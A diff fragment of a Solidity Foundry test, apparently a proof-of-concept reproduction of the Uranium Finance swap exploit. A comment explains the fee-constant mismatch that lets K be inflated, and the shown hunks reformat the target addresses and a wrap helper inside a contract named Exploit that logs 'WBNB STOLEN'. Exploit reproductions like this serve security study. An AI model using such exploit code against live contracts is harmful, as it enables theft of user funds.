@@ -22,10 +22,11 @@ Critically, we see in Uranium’s implementation that the magic value for fee ca
 The check does not apply the new magic value and instead uses the original 1000. 
 This means that the K after a swap is guaranteed to be 100 times larger than the K before the swap when no token balance changes have occurred.
 */
-    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    address  constant wbnb               = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-    address  constant busd               = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
-    address  constant uraniumFactory      = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
+CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
+address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
+
 interface IWrappedNative {
     function deposit() external payable;
 }
@@ -43,7 +44,7 @@ contract Exploit is Test {
         console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(address(this)));
     }
 
-     function wrap() internal {
+    function wrap() internal {
         IWrappedNative(wbnb).deposit{value: 1 ether}();
         console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
     }
